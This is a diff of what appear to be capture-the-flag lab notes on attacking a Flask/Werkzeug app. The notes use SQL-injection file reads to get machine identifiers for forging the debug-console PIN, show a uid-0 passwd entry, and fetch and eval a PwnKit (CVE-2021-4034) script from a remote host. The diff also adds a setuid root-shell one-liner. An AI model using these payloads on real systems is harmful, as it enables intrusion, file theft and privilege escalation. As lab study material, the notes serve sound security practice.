@@ -28,11 +28,13 @@
 # EXPLOIT
 + Trying to by pass PIN for werkerzeug 3.0.0 console.
 + Looting The File using SQL Injection File Export (LFI / SSRF):
-    - http://10.10.66.138:8000/download?id=' UNION ALL SELECT 'file:///proc/sys/kernel/random/boot_id
-    - http://10.10.66.138:8000/download?id=' UNION ALL SELECT 'file:///sys/class/net/eth0/address `02:e7:a8:eb:9a:87`
-    - http://10.10.66.138:8000/download?id=' UNION ALL SELECT 'file:///etc/machine-id `aee6189caee449718070b58132f2e4ba`
+    - http://10.10.183.238:8000/download?id=' UNION ALL SELECT 'file:///proc/sys/kernel/random/boot_id
+    - http://10.10.183.238:8000/download?id=' UNION ALL SELECT 'file:///sys/class/net/eth0/address `02:e7:a8:eb:9a:87`
+    - http://10.10.183.238:8000/download?id=' UNION ALL SELECT 'file:///etc/machine-id `aee6189caee449718070b58132f2e4ba`
 
     ```bash
+
+
     $python -c "print(0x02e7a8eb9a87)" 
     3193994713735
     $python gen_machine_id.py 
@@ -59,3 +61,6 @@ mcskidy:$1$mcskidy$FFrXzk8I7YLmzrU3mA9YX/:0:0::/home/mcskidy:/bin/bash
 python3 -c 'import crypt;print(crypt.crypt("somesecret", crypt.mksalt(crypt.METHOD_SHA512)))'
 python3 -c 'import crypt,getpass;print(crypt.crypt(getpass.getpass(), crypt.mksalt(crypt.METHOD_SHA512)))'
 eval "$(curl -s http://10.4.37.160:81/CVE-2021-4034/cve-2021-4034.sh)"
+
+
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
